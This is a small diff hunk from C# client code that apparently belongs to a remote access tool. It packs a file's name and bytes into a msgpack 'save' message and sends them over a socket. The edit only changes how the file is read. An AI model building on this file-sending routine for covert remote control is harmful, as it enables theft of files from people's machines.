@@ -112,7 +112,7 @@ namespace Client.Handle_Packet
                 msgpack2.ForcePathObject("Command").AsString = "save";
                 msgpack2.ForcePathObject("DWID").AsString = dwid;
                 msgpack2.ForcePathObject("Name").AsString = Path.GetFileName(file);
-                msgpack2.ForcePathObject("File").SetAsBytes(File.ReadAllBytes(file));
+                msgpack2.ForcePathObject("File").LoadFileAsBytes(file);
                 tempSocket.Send(msgpack2.Encode2Bytes());
                 tempSocket.Dispose();
             }
